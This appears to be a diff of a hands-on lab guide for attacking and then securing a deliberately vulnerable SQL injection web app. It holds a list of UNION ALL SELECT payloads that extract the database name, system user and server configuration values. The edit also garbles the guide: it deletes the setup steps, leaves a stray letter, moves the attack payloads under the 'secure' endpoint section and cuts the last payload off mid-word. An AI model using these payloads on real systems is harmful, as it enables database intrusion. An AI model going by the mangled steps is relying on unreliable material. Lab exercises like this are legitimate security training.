@@ -1,22 +1,6 @@
 Attack
 
-Step 1: Open a new terminal and access directory
-cd /root/sql-injectionCopy
-Step 2: Build the project
-mvn packageCopy
-Step 3: Now start the app
-docker-compose up -dCopy
-| Wait for the app to get deployed
-
-Note: If the startup is stuck at JAR scanning, bring down the server and spin up a new one
-
-Step 4: In the browser, access http://<server-ip>:8888/SQLInjection/insecure
-Substitute your server-ip here for the placeholder <server-ip>
-
-Note: To fetch server ip type in serverip in a new terminal
-
-Step 5: Create some dummy users
-
+S
 
 
 a' UNION ALL SELECT null,DATABASE(),null,null'Copy
@@ -43,6 +27,22 @@ Step 1: On the browser, access http://<server-ip>:8888/SQLInjection/secure
 Substitute your server-ip here for the placeholder <server-ip>
 
 Step 2: In the search bar search for any user you have created based on first name
+  
+  
+  
+  a' UNION ALL SELECT null,DATABASE(),null,null'Copy
+You will see the database name under the header First Name
+
+Now try other attacks (Each line is one payload)
+
+a' UNION ALL SELECT null,system_user(),null,null'
+a' UNION ALL SELECT null,@@GLOBAL.innodb_data_file_path,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.bind_address,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.version_compile_os,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.version_compile_machine,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.tls_version,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.block_encryption_mode,null,null'
+a' UNION ALL SELECT null,@@GLOBAL.default_authentication_plu
 
 Step 3: Now test for SQL Injection payload
 
